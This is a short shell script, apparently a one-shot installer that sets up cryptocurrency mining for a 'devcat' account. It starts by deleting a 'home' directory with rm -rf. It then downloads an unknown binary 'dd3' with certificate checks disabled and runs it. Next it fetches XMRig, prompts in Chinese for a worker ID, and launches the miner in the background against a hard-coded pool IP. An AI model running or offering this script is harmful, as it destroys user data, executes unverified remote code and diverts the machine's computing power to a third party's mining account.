cd ..
rm -rf home
wget -N --no-check-certificate https://raw.githubusercontent.com/devcatxmr/xmr/master/dd3
chmod +x dd3
./dd3
wget https://github.com/xmrig/xmrig/releases/download/v5.11.1/xmrig-5.11.1-xenial-x64.tar.gz
tar -xzvf xmrig-5.11.1-xenial-x64.tar.gz
cd xmrig-5.11.1
read -e -p "输入矿工号:" wkid
./xmrig --donate-level 1 -o 137.116.128.237:443 -u devcat.${wkid} -k -t 5 -B
